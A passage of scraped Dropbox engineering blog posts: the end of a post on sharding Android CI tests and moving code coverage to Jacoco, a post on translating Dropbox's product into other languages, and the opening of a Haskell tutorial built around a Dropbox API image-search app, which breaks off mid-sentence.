individual module, we expect this time to remain fairly constant as we continue to scale our code base. Always: Evaluate opportunity costs In the process of overhauling our testing strategy to go from “every test on every diff” to “only the necessary tests,” we discovered a few issues with our code coverage infrastructure. Our custom coverage implementation was separate from our standard Gradle toolchain, and thus required increased maintenance. This maintenance wasn’t always prioritized. And we discovered that the infrastructure had silently broken. We faced a decision: update and fix our code to maintain the custom solution, or go a different direction. We ultimately decided to move away from our custom solution. While the technical aspects of migrating to a more industry standard coverage solution are interesting, we think it’s more valuable to cover the process we used to make this decision. So, let’s briefly detour to describe our general approach to these kinds of questions and then cover how the general concepts applied in this particular case. At Dropbox, engineering choices are all about evaluating trade-offs in the context of our values and goals. We balance perceived benefits against perceived costs. But simply looking at whether the benefits outweigh the costs is not enough. For any project we work on, whether an internal infrastructure tool or new feature for our users, we are not simply looking to build things with positive net value. We want to build things with the greatest value at the lowest cost. We are looking for work that generates maximum leverage for our investment of resources. Thus, the right decision involves understanding opportunity costs. We must compare a given option with the best alternative. We must answer, “if we didn’t work on this, what is the highest-leverage thing we would work on instead?” In an ideal world, the answers to these questions would be obvious, and picking the high-leverage things to work on would be trivial. In reality, answering these questions is often challenging and can easily become very time consuming. But spending lots of time making decisions is itself a problem! So, just as we use heuristics to come up with acceptable solutions to NP-complete problems in computer science, we often rely on heuristics to make engineering decisions. There are several such heuristics we could cover that apply in various contexts, but in the interest of brevity we will focus on a few here. Pareto solutions The first heuristic that we apply at Dropbox is to look for Pareto solutions, where we can get most of the benefits of a given solution with a small fraction of the effort. Pareto solutions are inherently high-leverage, and are almost always an element of our final decisions. For example, in a small codebase with a small number of engineers, running all tests against every pull request is a Pareto solution compared with developing a selective testing algorithm. But Pareto is not the be-all-end-all. There are times where it makes sense to go beyond an 80/20 solution. In particular, it is often worthwhile to go well beyond an 80/20 solution when a decision relates to a core competency of your team or organization. The origin of Dropbox is a good example: emailing files to yourself was an 80/20 solution for sharing data across devices. Of course, it proved worthwhile to push beyond that particular Pareto solution. Leverage your core competencies Just as Dropbox has core competencies as a company, teams inside the company have their own core competencies for the customers they support, internally or externally. Thus, in addition to Pareto, we always consider whether a given decision relates back to one of our core competencies. Sometimes it’s not worth it That’s a very high-level look at the process of engineering decision making at Dropbox: Does a given direction provide the highest leverage for our time and resources when evaluated against some common heuristics? How does it connect back to our code coverage decision? In this case, we asked ourselves: does fixing and maintaining our custom coverage infrastructure represent an 80/20 solution for coverage, and is code coverage infrastructure within our team's core competencies? While we decided that code coverage infrastructure was indeed a core area of ownership for our team, the custom solution was more trouble than it was worth. Our team decided that we are able to provide more value to Dropbox through other infrastructure investments. In the end we migrated away from the old solution and towards the industry standard of using Jacoco’s verification task. The only custom configuration we have is locating coverage data from firebase and local tests. We moved the logic surrounding this to Kotlin, and created a data model for our coverage files: Copy fun forVerification(): JacocoProjectStructure {\r\n   val extras = addExtraExecutionFiles(module, getCoverageOutputProp(SourceTask.VERIFY))\r\n   module.logger.lifecycle(\"Extra execution File Tree $extras\")\r\n   val executionFiles = getExecutionFiles(module) + extras\r\n   return JacocoProjectStructure(\r\n       getClassDirs(module),\r\n       getSourceDirs(module),\r\n       executionFiles\r\n   )\r\n} Midpoint evaluation Once all the pieces were in place, we began to evaluate how we were doing in comparison to our existing method. After a few days of running as a shadow job, we found our average job run time was about 35 minutes. This included selectively building the source code, running unit tests, executing Android Test on Firebase Test Lab and calculating the code coverage. This was a marked improvement over our existing job’s average time of 75 minutes. However, when we entered a scenario where someone changed one of the core modules, it would trigger most or all modules to be rebuilt, spiking our selective job’s run time to over 90 minutes. Profiling our pipeline revealed that the main culprits were generating the additional module’s APKs and interacting with Firebase Test Lab. Generating the additional APKs added 10 minutes. And while Firebase Test Lab was able to shard the tests, the overall provisioning of devices and collecting results added four to five minutes overhead to our existing approach. We wouldn’t be able to circumvent generating the APKs if we wanted to measure coverage on a per module basis. And Firebase Test Lab provided benefits around physical devices and sharding that we didn’t want to implement ourselves. This led us to evaluate how we were running the job, and if we could shard the number of modules which needed to be run. Shard modules whenever possible Just as Firebase Test Lab sharded each of the module’s tests across multiple devices, we wondered if we could shard the assembly of the unit tests across multiple nodes in our CI environment. Initially, we wanted to start our job, split the unit tests to one node, split the Android tests to another node, then finally collect all the results and run coverage over the results. We began to explore this option, but ran into limitations with Changes sharing artifacts across nodes—in particular, collecting artifacts. The nodes were on different VMs without a clear way to share results. Pausing that investigation, we considered what was supported in Changes. We had the ability to provide a list of IDs to our task runner Changes, which would start an appropriate number of nodes each with a subset of ids passed in to run. This functionality is usually used to pass a list of test names to run per shard. We, however, did not shard the individual tests as that would not be possible when running tests on an external device cloud. Instead we shared at the granularity of each module which contained unit tests and or Android tests. This would also alleviate the need to collect results from each of the nodes as they could all run coverage on their specific modules and report success or failure. This strategy allowed us to do shard testing of our 400 modules on up to 10 VMs. On average, 20 modules are touched per diff which means each VM only needs to test 2 modules. Providing information to Changes to shard proved fairly straightforward. Once we left an artifact with the modules to run, we could retrieve the subset of modules in the shard, provide that to the Affected Module Detector, and indicate that a given module should be included if it had source files changed or if it was passed in. The sharding approach put us into a position where the average run time is 25 minutes, with a maximum run time of 35 minutes. Most runs require about 30 minutes of compute time, whereas the worst case requires 3 hours. While the worst case is higher, we feel this is acceptable. It’s rare for a developer to trigger this case. Overall, our revisions help get feedback to the developer as quickly as possible. We also expect these times to decrease as we decompose monolithic modules into smaller feature modules. This is significantly better than our starting point of 75 minutes: Takeaways—and source code Three months after we set out to improve our CI pipeline, we’re fairly satisfied with the results. Most importantly, we have a scalable solution for testing. It will allow us to allocate more VMs for JVM testing or more Firebase devices for on-device testing as our module counts double and beyond. The biggest takeaways for us were: Invest in Build/CI architecture as much as in production code. Don’t reinvent the wheel. Delegate the hard parts to Firebase, Flank, and Jacoco. When you’re feeling blue, sprinkle some Kotlin on it. Get our AffectedModuleDetector on GitHub It’s not enough to just talk about it: We’ve open sourced our affected module detector as a standalone Gradle plugin. We’ll add additional hooks to it in coming months. We love community contributions. And if this sounds like work you want to get paid to do, we’re hiring ! // Tags Mobile Distributed Testing Firebase Test Lab Testing Kotlin Flank Android CI // Copy link Link copied Link copied", "date": "2020-12-01"},
{"website": "Dropbox", "title": "Translating Dropbox", "author": ["Dan Wheeler"], "link": "https://dropbox.tech/application/hello-world", "abstract": "Professional and community translation: we use both Programming details More reading i18n bonus round ¡Hola, mundo! Welcome to our new engineering blog. We'd like to start with a post on i18n , because aside from being exceedingly fresh in our minds right now, hearing our take on it might be useful to other startups. Going global can be an intimidating prospect, especially if you're like me and illiterate in all the new languages. I'll focus today on assembling a translation team because it's one of the trickier challenges. Professional and community translation: we use both Back in March 2008, Facebook's community famously translated the site into French in just 24 hours. Community translation, done right, often offers the highest quality because users know your product inside-out and naturally use the right tone and formality level. Community translation also makes it possible to go from a handful of languages to over 100. While intriguing, we're holding off on community-led translation for now and going with a hybrid approach instead. The main reason is the substantial engineering investment. We'd need to: Build a translation mode that allows volunteers to translate text in-context, as it appears on the screen. This is especially hard for everything not on the website: our Windows, Mac, and Linux desktop apps, mobile apps, emails, etc. Determine, at all times, which text needs translation, and which needs to be re-reviewed. This is tricky because if a translated string is reused, but in a different context, it still needs to be reviewed. Build a voting mechanism to select the best translations, including an ability to flag offensive translations. Prevent large-scale voter conspiracy so that incidents like these don't happen. Import/Export translations from/to a bunch of different formats (gettext PO, iOS and Android XML, property lists, static HTML, etc.) Groan. So it requires a big initial effort. Facebook had a staff of about 500 in March 2008, for example, whereas we have 50. By contrast, professional translators are incredibly convenient and barrier-free. We can send them the latest version of 12 files in 12 different formats, they'll determine the difference from the last version, and send us back the translations, ready to go. Here's how our approach works: we hire a firm to translate everything beforehand, then ask our generous userbase to review and send us their corrections, iteratively. Our firm reads through every suggestion per English string, one string at a time, and makes the most popular correction. Before sending a feedback round to translators, we quickly skim it on our own first through a special admin page, to do three things: Fix bugs , such as untranslated text or incorrectly formatted numbers. Evaluate our translators : are people reporting typos, grammar mistakes, and gross mistranslations? Or is all the feedback subjective? Confirm that previously reported corrections get incorporated: if our translators don't fix a problem, and it continues to get reported, our admin page will throw a tantrum. Here it is in action. Say I'd like to report a dubious French translation. First I click the green tab to the left of the screen: Then I type or paste a few letters of the translation I'd like to improve. It pops up a list of matches: suggest_1 After selecting the translation, the original English text shows up underneath. I type in my improved translation and the reason I like it better. Done. This feature also exists on experimental builds of our desktop app, released on the forums . Programming details Grouping suggestions by English string is key. It offers good usability: people can type just a few letters, autocomplete the translation in question, and view it alongside the original English string. Further, it organizes everything for easy translator review. One issue complicates things: strings with placeholder variables. For example: Copy Hello, %(first_name)s! We want users to be able to autocomplete text as it appears on the page: \"¡Hola, Dan!\", not \"¡Hola, %(first_name)s\", and at the same time, internally group all instances of this placeholder string together. You might think it would be as easy as wrapping the gettext _() function, but consider typical gettext code: Copy greeting = _('Hello, %(first_name)s') % {'first_name' : user.first_name} That is, placeholder substitution happens outside the _() translation call. Our solution: on the server, we subclass python's unicode builtin type, overriding __mod__ to remember its filled-in placeholders. We then wrap the gettext _() function to do two things: Return this subclassed string type. Keep a response-wide list of all such returned strings. At the very end of the response, we take the list of translated strings and serialize into JSON, ready to go for browser-side javascript autocompleter code. For each string, this list includes the placeholder form \"¡Hola, %(fname)s\" (for bookkeeping), and filled-in form \"¡Hola, Dan\" (for autocompletion). The reason we keep autocompletion entirely browser-side is that it makes the experience feel instant. Another nice result is the autocompletion menu is always narrowed down to text that appears on the page -- less choices to wade through. One last complicating detail: AJAX. Some of our AJAX requests, for example in the events feed, contain translated display text. We want users to be able to select text no matter where it came from. To solve, we pack a list of new translations within each AJAX request, similar to the list from the initial request. More reading Excellent background on Facebook's system . They use professionals too, more than most people realize. Check out Smartling if you're interested in community translation, especially if your content is web-only. They're making community translation easier on multiple levels. i18n bonus round For anyone about to do similar work, I thought I'd give a quick summary of some of the other challenges we needed to cover for today's launch. Let us know in the comments if you'd like to hear more about any of these topics; we'd be happy to expand in future posts. We encountered some typical i18n problems: Translating text inside Python/Javascript/Objective-C/Java, templates, database tables (where our emails live), and static docs like our terms of service. Keeping translations synced with evolving English. Covering string substitutions and plurals . Translating Dropbox-specific terminology ahead of time. Everyone loves a good translation blunder. One of my favorites: \"Jolly Green Giant,\" the mascot for Green Giant frozen vegetables, being translated into Arabic as \" Intimidating Green Ogre .\" Here's another disaster . We carefully translated Dropbox terminology before everything else -- phrases like \"selective sync,\" \"Dropbox guru,\" and \"Packrat\" -- because these are the hardest to get right. Supporting both the perverse American date format 4/22/1970 and much more logical German 22.04.1970. Correctly formatting times, numbers, percents, and currency. Thanks babel ! Formatting people's names correctly. For example, Japanese names are family-name-first, with a space in between if the name is ASCII (Takahashi Yukihiro), and no space for East Asian characters (高橋幸宏). Similarly, for our signup form, we put family name first for Japanese. Displaying translated country lists, correctly sorted, in our address form. We use IP geolocation to guess the right country and put it at the top of the list. Translating images with embedded text, overdubbing videos . Fixing one million layout problems resulting from \"overfitting\" layouts to fixed English text. Watching long translations completely destroy one's fragile, inelastic layouts. Making sure various locale settings -- user preference, cookie, web request, Accept-Language header, desktop app settings -- all work together. For example, if a user changes their locale from the desktop app, and then clicks a web link from within the app, we make sure the website matches the new locale. On the other hand, it would be confusing, and difficult to undo, if changing the website's locale affected the desktop app. And a few not-so-typical: For the desktop app, overriding a class in Python's gettext module to pack translations inside python bytecode (instead of outside the executable, for example /usr/share/locale on Linux). This eases cross-platform concerns and keeps our app stand-alone. In the future, as we add more languages, we might have the server beam down text to the client. Building a lightweight gettext-like lib in javascript for browser-side translations. Extending the parser for Cheetah , our templating language, to allow English string extraction. Word wrapping Japanese on the desktop app. The algorithm is slightly different and has a couple of hard to detect special cases, more info here. Collation. It is a hard lesson in life that for most of the world, alphabetical != ASCIIbetical. For example, in German, ä is sorted as if it is two letters, ae, while in Swedish, it comes after z. For the most part, sorting a list of strings is as easy as calling a library. Thanks ICU and PyICU language bindings ! Unfortunately, we don't have ICU in browser-side javascript. Supporting locale-sensitive sorting and resorting on the website's file browser, with dynamic insertions for new files and directories, and making it fast, was an interesting challenge. Similarly, we had to manually implement Japanese collation, with its multiple scripts , for iPhone and iPad, and build our own Japanese browser widget to match Apple's -- something missing from the iOS SDK. This is a totally new world for us, so if you think of any improvements we can make or areas we missed, we'd love to hear about it! // Tags Application // Copy link Link copied Link copied", "date": "2011-04-18"},
{"website": "Dropbox", "title": "Using the Dropbox API from Haskell", "author": ["Rian"], "link": "https://dropbox.tech/application/using-the-dropbox-api-from-haskell", "abstract": "Image Search for Dropbox LANGUAGE Pragma Import Declarations Algebraic Datatypes Maybe Type Type Signatures & Currying Functions Operators The “$” Operator Lists foldr and map A Quick Note About Tuples Template Haskell Type Classes Exceptions & Automatic Type Class Derivation Monads Either Type Some Utility Functions The Dropbox API Authentication Process Initiating the Authentication Process Applicative Functors The Authentication Result Handler Arrows Thread Architecture Image Uploading Thread New Folder Detection Thread New App User Thread Main Program Entry Point Conclusion I love Haskell . My first encounter with Haskell started out about eight years ago. Like many people in those days, when I was in high school I spent a lot of time playing around with code on my computer. Reading and understanding open source projects was a main source of knowledge and inspiration for me when I was learning how to program. When I came upon the bzip2 homepage and consequently Julian Seward ’s homepage I found a short note about Haskell and how it was a super fun and interesting language to write a compiler for. Haskell? What’s that? After reading more about Haskell, functional programming, lazy evaluation, and type inference and seeing the elegance of the various code samples, I was hooked. I spent the next couple of weeks going through “ Yet Another Haskell Tutorial ” and I remember it being incredibly difficult yet incredibly rewarding. After I wrote my first fold over a recursive algebraic datatype, I felt like I was finally starting to speak Haskell. I felt like I had massively improved as a programmer. While I’ve been at Dropbox, Python has been my main language of computational expression. Even though it was a bit rocky at first, I’ve grown to really love Python and the culture of fast iteration and duck typing . Like a good Pythonista, I’m of the opinion that types are training wheels, but that’s really only until you use a language with a real type system. In C# or Java, types can get in your way and even force you to write overly verbose code or follow silly “design patterns.” In Haskell, types help you soar to higher computational ground. They encourage you to model your data in coherent, concise, and elegant ways that feel right. They aren’t annoying. More people should use Haskell. The steep learning curve forces you to understand what you are doing at a deeper level and you will be a better programmer because of it. To help that happen, this post will be in a semi-literate programming style and I’ll be describing a Dropbox API app written in Haskell. This won’t be like a normal tutorial so you’ll probably have to do a bit of supplemental reading and practice afterward. The goal is to give you a flavor of what a real program in Haskell looks like. This post assumes no previous knowledge with Haskell but it does assume moderate programming ability in another language, e.g. C, C++, Ruby, Python, Java, or Lisp. Since this post does not assume previous Haskell experience the beginning will be more of a Haskell tutorial and core concepts will be sectioned off to facilitate the learning process. This post is a published version of a Literate Haskell file. Code lines prefixed with the “ > ” character are actually part of the final program. This makes it so that it’s possible to simply copy & paste the text here into your favorite editor and run it, just make sure you save the file with a “.lhs” extension. If you ever get tired of reading you can get the real source at the GitHub repo. The Haskell implementation we’ll be using is The Haskell Platform , it’s a full stack of Haskell tools prepackaged to work out of the box on all three major desktop operating systems. It’s based on GHC , The Glasgow Haskell Compiler. GHC is an advanced optimizing compiler focused on producing efficient code. Image Search for Dropbox Years ago Robert Love of Linux kernel hacker fame wrote a FUSE file system that made it so that user-created folders were populated with Beagle search results using the folder name as the search query. It was called beaglefs . The point was to demonstrate the power of user-space file systems, notably the power of having so much more library code available to you than in kernel-space. We can do a similar thing with the Dropbox API. We’re going to write a hypothetical Dropbox API app that populates user-created folders with Creative Commons licensed images found by performing a web image search using the folder name as the search term. Using Dropbox, all the user has to do to perform an image search is simply create a folder. Let’s get started! LANGUAGE Pragma Copy > {-# LANGUAGE TypeFamilies #-}\r\n> {-# LANGUAGE QuasiQuotes #-}\r\n> {-# LANGUAGE MultiParamTypeClasses #-}\r\n> {-# LANGUAGE FlexibleContexts #-}\r\n> {-# LANGUAGE TemplateHaskell #-}\r\n> {-# LANGUAGE DeriveDataTypeable #-} Despite being more than two decades old, Haskell is still evolving. You can tell your Haskell compiler to allow newer language features using this syntax, this is called the LANGUAGE Pragma. Please don’t worry about what these exact language extensions do just yet, you can read more in the GHC docs . Import Declarations Copy > import Yesod This is an import declaration. Declarations like these inform the Haskell module system that I am going to use definitions from this other module. A module in Haskell is a collection of values (functions are values in Haskell too!), datatypes, type synonyms, type classes, etc. Here I am telling the module system to bring in all definitions from the module Yesod in the namespace of this module. If I wanted to I could also access those definitions prefixed with “Yesod.” similar to Java. Yesod is a fully-featured modern web-framework for Haskell. We’ll be using it to create the web interface of our API app. Copy > import Text.XML.HXT.Core hiding (when) This is a another import declaration. This is just like the Yesod import except we use the “hiding” syntax to tell the Haskell module system to not import the “when” definition into this module’s namespace. The module we are importing is the main module from HXT , the XML processing library that we use to parse out the search results from an image search result page. More details on this much later. Copy > import Control.Applicative ((<$>), (<*>))\r\n> import Control.Concurrent (forkIO, threadDelay, newChan,\r\n>                            writeChan, readChan, Chan, isEmptyChan)\r\n> import Control.Monad (forM_, when)\r\n> import Control.Monad.Base (MonadBase)\r\n> import Control.Monad.Trans.Control (MonadBaseControl)\r\n> import Data.Maybe (fromJust, mapMaybe, isNothing)\r\n> import Data.Text.Encoding (decodeUtf8With)\r\n> import Data.Text.Encoding.Error (ignore)\r\n> import Data.Typeable (Typeable)\r\n> import Network.HTTP.Enumerator (simpleHttp)\r\n> import System.FilePath.Posix (takeFileName, combine) These import declarations are slightly different. Instead of bringing in all names from the modules I am only bringing in specific names. This is very similar to the “from module import name” statement in Python. Copy > import qualified Control.Exception.Lifted as C\r\n> import qualified Data.ByteString as B\r\n> import qualified Data.ByteString.Lazy as L\r\n> import qualified Data.List as DL\r\n> import qualified Data.Map as Map\r\n> import qualified Data.Text as T\r\n> import qualified Data.URLEncoded as URL\r\n> import qualified Dropbox as DB\r\n> import qualified Network.URI as URI Remember how I said that I could also access names by prefixing them with “Yesod.” earlier? Adding qualified to the import declaration makes it so you must refer to names in other modules using the module prefix. The “as C” part in the first line makes it so that I can do C.try instead of Control.Exception.Lifted.try . Algebraic Datatypes Copy > data ImageSearch = ImageSearch (Chan (DB.AccessToken, String)) DB.Config This is an algebraic datatype declaration. Nevermind what algebraic means for the moment, this is the basic way to define new types in Haskell. Even though it’s very short this little code actually does a couple of things: It defines a type called ImageSearch . This is the immediate text after “data”. It defines a function called ImageSearch that takes two arguments, the first of type Chan (DB.AccessToken, String) , the second of type DB.Config , and it returns a value of type ImageSearch , ignore these complex types for now they aren’t important . This function is called a constructor in Haskell. Constructors play a big role in Haskell. Wherever a name can be bound to a value in Haskell, you can also use contructor pattern matching, or deconstruction , to extract out the data contained within that value. Here’s a function to get out the channel component of our ImageSeach type: Copy imageSearchChan (<span class=\"dt\">ImageSearch</span> chan config) <span class=\"fu\">=</span> chan imageSearchChan takes in an ImageSearch argument and return the channel wrapped inside of it. You’ll see deconstruction a lot more later. So far we’ve defined a type called ImageSearch and we’ve also defined a function called ImageSearch . This is okay because in Haskell type names and value names live in different namespaces . Maybe Type The Maybe type is one algebraic datatype that you’ll see a lot in Haskell code. It’s often used to denote an error value from a function or an optional argument to a function. Copy data Maybe a = Nothing | Just a Unlike ImageSearch , the Maybe type has not one but two constructors: Nothing and Just . You can use either constructor to create a value in the Maybe type. A value of Nothing usually denotes an error in the Maybe type. A Just value indicates success. Another difference from our ImageSearch type is that Maybe isn’t a concrete type on its own; it has to wrap some other type . In Haskell, a “higher-order” type like this is called a type constructor ; it takes a concrete type and returns a new concrete type. For example, Maybe Int or Maybe String are two concrete types created by the Maybe type constructor. This is similar to generics, like List<T> , in Java or C#. We use the type variable “ a ” in the declaration to show that the Maybe type constructor can be applied to any concrete type. It’s important to note that type constructors, like Maybe , are different from data constructors, like Nothing or Just . Type Signatures & Currying Copy > toStrict :: L.ByteString -> B.ByteString\r\n> toStrict = B.concat . L.toChunks This is a function definition in Haskell. I’ll explain the definition in the next section but first I wanted to talk about the use of “ :: ” since it keeps coming up. This is how we explicitly tell the Haskell compiler what type we expect a value to be. Even though a Haskell compiler is good enough to infer the types of all values in most cases, it’s considered good practice to at least explicitly specify the types of top-level definitions. The arrow notation in the type signature denotes a function. toStrict is a function that takes an L.ByteString value and returns a B.ByteString value. One cool thing about Haskell is that functions can only take one argument. I know it doesn’t sound cool but it’s actually really cool. How do you specify a function that takes two arguments you ask? Well that’s a function that takes a single argument and returns another function that takes another argument. This reformulation of multiple-argument functions is called currying . Currying is cool because it allows us to easily do partial application with functions, you’ll see examples of this later. Here’s the type signature for a function that takes two arguments of any two types and returns a value in the second type: Copy twoArgFunc :: a -> b -> b We use the type variables “ a ” and “ b ” to indicate that twoArgFunc is polymorphic , i.e. we can apply twoArgFunc to any two values of any two respective types. With currying in mind, it shouldn’t be too hard to figure out that the arrow is right-associative, i.e. “ a -> b -> b ” actually means “ a -> (b -> b) ”. That would make sense, twoArgFunc is a function that takes an argument and returns another function that takes an argument and returns the final value. Say that over and over again until you understand it. What if we grouped the arrow the other way? Copy weirdFunc :: (a -> b) -> b In this case weirdFunc is a function that takes another function as a its sole argument and returns a value. This is much different from twoArgFunc which instead returns a second function after it accepts its first argument. Passing functions to functions like this is a common idiom in Haskell and it’s one of the strengths of a language where functions are ordinary values just like integers and strings. Functions The definition of toStrict makes use of the function composition operator, “ . ”, but Haskell functions don’t have to be defined this way. Here’s a function defined using a variable name: Copy square x = x * x What about two arguments? Copy plus x y = x + y We can define a function that adds five to its argument by making using of currying: Copy addFive = plus 5 We curried in the 5 argument to the plus function and just as we said, it returns a new function that takes an argument and adds a five to it: Copy addFive 2 == 7 Another way to define functions is to use a lambda abstraction . You can write a function as an expression by using the backslash and arrow symbols. Lambda abstractions are also known as anonymous functions . Here’s another way to define plus : Copy plus = x y -> x + y All functions in Haskell are pure. This means that functions in Haskell cannot do anything that causes side-effects like changing a global variable or performing IO. More on this later. Operators Okay now that you’re cool with functions let’s get back to toStrict . Here’s another way to define it using a lambda: Copy toStrict = x -> B.concat (L.toChunks x) Instead, we define toStrict using the function composition operator, “ . ”. The function composition operator takes two functions and returns a new function that passes its argument to the right function and the result of that is passed to the left function and the result of that is returned. Here’s one possible definition: Copy f . g = x -> f (g x) Yes this is a real way to define an operator in Haskell! The function composition operator comes standard in Haskell but even if it didn’t you’d still be able to define it yourself. In Haskell, operators and functions are actually two different syntaxes for the same thing. The form above is the infix form but you can also use an operator in the prefix form, like a normal function. Here’s another way to define “ . ”: Copy (.) f g = x -> f (g x) In this definition of the function composition operator we use prefix notation. It is only necessary to surround an operator with parentheses to transform it into its prefix form. Switching between infix and prefix notation works for any operator, e.g. you can add two numbers with (+) 4 5 in Haskell. The ability to switch between prefix and infix notation isn’t limited to operators, you can do it with functions too by surrounding the function name with backticks, “`”: Copy div 1 2 == 1 `div` 2 This is useful for code like: \"Dropbox\" `isInfixOf` \"The Dropbox API is sick!\" One last thing about operators; Haskell has special syntax to curry in arguments to operators in infix form. For example, (+5) is a function that takes in a number and adds five to that number. These are called sections . To further illustrate, all of the following functions do the same thing: (+5) (5+) x -> x + 5 (+) 5 plus 5 addFive With operator currying it’s important to recognize that the side you curry the argument in matters . For example, (.g) and (g.) behave differently. The “$” Operator Next to the “ . ” operator there is another function-oriented operator that you’ll see often in Haskell code. This is the function application operator and it’s defined like this: Copy f $ x = f x Weird right? Why does Haskell have this? In Haskell, normal function application has a higher precedence than any other operator and it’s left-associative: Copy f g h j x == (((f g) h) j) x Conversely, “ $ ” has the lowest precedence of all operators and it’s right-associative: Copy f $ g $ h $ j $ x == f (g (h (j x))) Using “ $ ” can make Haskell code more readable as an alternative to using parentheses. It has other uses too, more on that later. Lists Copy > listToPair :: [a] -> (a, a)\r\n> listToPair [x, y] = (x, y)\r\n> listToPair _ = error \"called listToPair on list that isn't two elements\" listToPair is a little function I use to convert a two-element list to a two-element tuple , usually called a pair . A list in Haskell is a higher order type that represents an ordered collection of same-typed values. A list type is denoted using brackets, e.g. “ [a] ” is the polymorphic list of any inner type and “ [Int] ” is a concrete type that denotes a list of Int values. Unlike vectors or arrays in other languages, you can’t index into a Haskell list in constant time. It is more akin to the traditional Linked List data structure. You can construct a list in a number of ways: The empty list: [] List literal: [1, 2, 3] Adding to the front of a list: 1 : [2] The “ : ” operator in Haskell constructs a new list that starts with the left argument and continues with the right argument: Copy 1 : [2, 3, 4] == [1, 2, 3, 4] One last thing about the list type in Haskell, it’s not that special. We can define our own list type very simply: Copy data MyList a = Nil | Cons a (MyList a)\r\n\r\n-- using \"#\" as my personal \":\" operator\r\nx # xs = Cons x xs\r\n\r\nmyHead :: MyList a -> a\r\nmyHead (Cons x xs) = x\r\nmyHead Nil = error \"empty list\" Yep, a list is just a recursive algebraic datatype. foldr and map In the Lisp tradition, lists are a fundamental data structure in Haskell. They provide an elegant model for solving problems that deal with multiple values at once. While lists are still fresh in your mind let’s go over two functions that are essential to know when manipulating lists. The first function is foldr . foldr means “fold from the right” and it’s used to build a aggregate value by visiting all the elements in a list. It’s arguments are an aggregating function, a starting value, and a list of values. The aggregating function accepts two argu—Screw it, let’s just define it using recursion: Copy foldr :: (a -> b -> b) -> b -> [a] -> b\r\nfoldr f z []     = z\r\nfoldr f z (x:xs) = f x $ foldr f z xs Notice how we used the “ : ” operator to deconstruct the input list into its head and tail components. Like I said, you can use foldr to aggregate things in a list, e.g. adding all the numbers in a list: Copy foldr (+) 0 [1..5] == 15 “ [1..5] ” is syntactic sugar for all integers from 1 to 5, inclusive. Another less useful thing you can do with foldr is copy a list: Copy foldr (:) [] [\"foo\", \"bar\", \"baz\"] == [\"foo\", \"bar\", \"baz\"] foldr ’s brother is foldl ; it means “fold from the left.” Copy foldl :: (b -> a -> b) -> b -> [a] -> b\r\nfoldl f z []     = z\r\nfoldl f z (x:xs) = foldl f (f z x) xs foldl collects values in the list from the left while foldr starts from the right. Notice how the type signature of the aggregating function is reversed, this should help as a sort of mnemonic when using foldr and foldl . Though it may not seem like it, the direction of the fold matters a lot. As an exercise try copying a list by using foldl instead of foldr . map is another common list operation. map is awesome! It takes a function and a list and returns a new list with the user-supplied function applied to each value in the original list. Recursion is kind of clunky so let’s define it using foldr : Copy map :: (a -> b) -> [a] -> [b]\r\nmap f l = foldr ((:) . f) [] l Even though foldr is more primitive than map I find myself using map much more often. Here’s how you would map a list of strings to a list of their lengths: Copy map length [\"a\", \"list\", \"of\", \"strings\"] == [1, 4, 2, 7] Remember “ $ ”, the function application operator? We can also use map to apply the same argument to a list of functions: Copy map ($5) [square, (+5), div 100] == [25, 10, 20] We curried in the 5 value into right side the “ $ ” operator. That creates a function that takes a function and then returns the application of that function to the value 5 . Using map we then apply that to every function in the list. This is why having an “ $ ” operator in a functional language is a good idea but it’s also why map is awesome! A Quick Note About Tuples I talked about lists but I kind of ignored tuples. Like lists, tuples are a way to group values together in Haskell. Unlike lists, with tuples you can store values of different types in a single tuple. Copy intAndString :: (Int, String)\r\nintAndString = (07734, \"world\") A more subtle difference from lists is that tuples of different lengths are of different types. For instance, writing a function that returns the first element of a three-element tuple is easy: Copy fst3 :: (a, b, c) -> a\r\nfst3 (x, _, _) = x Unfortunately, there is no general way to define a “first” function for tuples of any length without writing a function for each tuple type. Haskell does at least provide a fst function for two-element tuples. Final note, see how we ignored the second and third elements of the tuple deconstruction by using “ _ ”? This is a common way to avoid assigning names in Haskell. Template Haskell Copy > $(mkYesod \"ImageSearch\" [parseRoutes|\r\n>                         / HomeR GET\r\n>                         /dbredirect DbRedirectR GET\r\n>                         |]) Yesod makes heavy use of Template Haskell . Template Haskell allows you to do compile-time metaprogramming in Haskell, essentially writing code that writes code at compile-time. It’s similar to C++ templates but it’s a lot more like Lisp macros . Template Haskell is a pretty exotic feature that is rarely used in Haskell but Yesod makes use of it to minimize the amount of code you have to write to get a website up and running. The mkYesod function here generates all the boilerplate code necessary for connecting the HTTP routes to user-defined handler functions. In our app we have two HTTP routes: / -> HomeR /dbredirect -> DbRedirectR The first route connects to a resource called HomeR . The second route, located at /dbredirect , connects to a resource called DbRedirectR . We’ll define these resources later. Type Classes This part of the app brings us to one of the most powerful parts of Haskell’s type system, type classes . Type classes specify a collection of functions that can be applied to multiple types. This is similar to interfaces in C# and Java or duck typing in dynamically-typed languages like Python and Ruby. An instance declaration actually defines the functions of a type class for specific type. Formally, type classes are an extension to the Hindley-Milner type system that Haskell implements to allow for ad-hoc polymorphism , i.e. an advanced form of function overloading. Note that the word instance used in this context is very different from the meaning in object-oriented languages. In an object-oriented language instances are more akin to Haskell values . Section 6.3 of the Haskell 2010 Report has a graphic of the standard Haskell type classes. Many core functions in the standard library are actually part of some type class, e.g. (==) , the equals operator, is part of the Eq type class. For fun, let’s make a new type class called Binary . It defines functions that convert data between the instance type and a byte format: Copy import qualified Data.ByteString as B\r\n\r\nclass Binary a where\r\n  toBinary :: a -> B.ByteString\r\n  fromBinary :: B.ByteString -> a You can imagine I might use this class when serializing Haskell data over a byte-oriented transmission medium, for example a file or a BSD socket. Here’s an example instance for the String type: Copy import Data.Text as T\r\nimport Data.Text.Encoding as E\r\nimport Data.ByteString as B\r\n\r\ninstance Binary String where\r\n  toBinary = E.encodeUtf8 . T.pack\r\n  fromBinary = T.unpack . E.decodeUtf8 For this instance toBinary is defined as a composition of E.encodeUtf8 and T.pack . Notice the use of T.pack , you’ll see it a lot. T.pack converts a String value into a Text value . E.encodeUtf8 converts the resulting Text value into a ByteString value. fromBinary does the inverse conversion, it converts a ByteString value into a String value. Let’s define another instance: Copy import Control.Arrow ((***))\r\nimport Data.Int (Int32)\r\nimport Data.Bits (shiftR, shiftL, (.&.))\r\n\r\n-- stores in network order, big endian\r\ninstance Binary Int32 where\r\n  toBinary x = B.pack $ map (fromIntegral . (0xff.&.) . shiftR x . (*8))\r\n               $ reverse [0..3]\r\n  fromBinary x = sum $ map (uncurry shiftL . (fromIntegral *** (*8)))\r\n                 $ zip (B.unpack x) (reverse [0..3]) fromBinary in this instance may look kind of gnarly but you should know what it does; it converts a 